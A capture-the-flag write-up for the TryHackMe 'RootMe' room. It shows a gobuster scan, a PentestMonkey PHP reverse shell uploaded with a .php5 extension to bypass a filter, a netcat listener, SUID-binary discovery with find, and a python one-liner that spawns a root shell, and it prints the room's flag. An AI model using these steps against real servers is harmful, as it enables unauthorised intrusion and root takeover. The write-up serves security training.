---
layout: single
title: "RootMe"
link: "https://tryhackme.com/room/rrootme"
parent: TryHackMe
os: Linux
difficulty: Easy
tags: [Gobuster, Netcat, Python, Find]
starred: false
date: 2025-11-08
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
```bash
gobuster dir -u http://<Machine-IP>/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt

/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

We need the `/panel` which is a file upload page.

## 2. Initial Access
### Exploitation
We can create a reverse shell using [***PentestMonkey***](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and upload with the `.php5` extension.
Then open the file on the following url while opening your netcat.

```bash
nc -lnvp 1234
```

```
rootme.thm/uploads/php-reverse-shell.php5
```

### Find SUID Binaries
Search for files with the SUID bit set.

```bash
find / -type f -perm -4000 2>/dev/null
```

Or, using the THM hint (finding files owned by root with the SUID bit):

```bash
find / -user root -perm /4000
```

## 3. Priviledge Escalation
We can exploit the following SUID binary:

`/usr/bin/python2.7`

Run the following command to gain a shell:

```bash
python -c 'import os; os.system("/bin/sh")'
```

### 4. Flag

`THM{pr1v1l3g3_3sc4l4t10n}`

---

{% comment %}

[Technique]: Web Directory Scan
[Command]: gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
[Why]: Found the /panel/ upload endpoint which was hidden.

[Technique]: File Upload Bypass
[Command]: mv shell.php shell.php5
[Why]: Bypassed upload filters by using an alternative PHP extension (.php5).

[Technique]: SUID Python PrivEsc
[Command]: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
[Why]: Spawns a root shell because the python binary had the SUID bit set.

{% endcomment %}